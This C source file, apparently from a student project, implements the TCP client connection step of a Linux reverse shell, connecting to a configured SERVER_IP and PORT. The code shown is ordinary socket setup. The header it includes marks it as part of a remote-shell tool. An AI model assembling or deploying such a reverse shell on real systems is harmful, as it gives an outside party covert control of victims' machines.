/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   berkeley_client_connection.c                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 14:39:53 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 19:18:58 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include "linux_reverse_shell.h"

int	berkeley_client_connection(int	*client_fd)
{
	struct sockaddr_in	server_addr;

	*client_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (*client_fd == -1)
		return (errno);
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr.s_addr) <= 0)
	{
		close(*client_fd);
		return (errno);
	}
	if (connect(*client_fd, (struct sockaddr *)&server_addr,
			sizeof(server_addr)) == -1)
	{
		close(*client_fd);
		return (errno);
	}
	return (SUCCESS);
}
